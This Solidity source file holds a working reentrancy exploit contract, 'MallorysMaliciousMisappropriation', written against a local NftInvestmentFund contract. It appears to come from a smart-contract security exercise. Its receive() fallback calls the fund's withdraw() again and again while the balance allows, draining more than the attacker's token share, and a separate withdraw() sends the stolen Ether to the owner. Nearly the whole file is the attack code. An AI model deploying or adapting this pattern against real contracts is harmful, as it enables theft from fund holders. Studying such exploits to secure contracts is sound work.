// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import { NftInvestmentFund } from "./NftInvestmentFund.sol";
import { FundToken } from "./FundToken.sol";
import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";

contract MallorysMaliciousMisappropriation is Ownable {
	NftInvestmentFund public nftInvestmentFund;
	uint256 private tokenCount;

	error InvestmentFundNotEnded();
	error FailedToSendEther();

	constructor(address payable _nftInvestmentFundAddress) Ownable(msg.sender) {
		nftInvestmentFund = NftInvestmentFund(_nftInvestmentFundAddress);
	}

	// Receive is called when the contract receives Ether
	// solhint-disable-next-line no-complex-fallback
	receive() external payable {
		// The attack
		uint256 withdrawAmount = (nftInvestmentFund.balanceAtEnd() / nftInvestmentFund.fundTokensAtEnd()) * tokenCount;
		if (address(nftInvestmentFund).balance >= withdrawAmount) {
			nftInvestmentFund.withdraw();
		}
	}

	function attack() external onlyOwner {
		if (!nftInvestmentFund.ended()) revert InvestmentFundNotEnded();

		FundToken fundToken = FundToken(nftInvestmentFund.fundToken());
		tokenCount = fundToken.balanceOf(address(this));
		fundToken.approve(address(nftInvestmentFund), tokenCount);

		nftInvestmentFund.withdraw();
	}

	function withdraw() external onlyOwner {
		(bool sent, ) = payable(msg.sender).call{ value: address(this).balance }("");
		if (!sent) revert FailedToSendEther();
	}
}
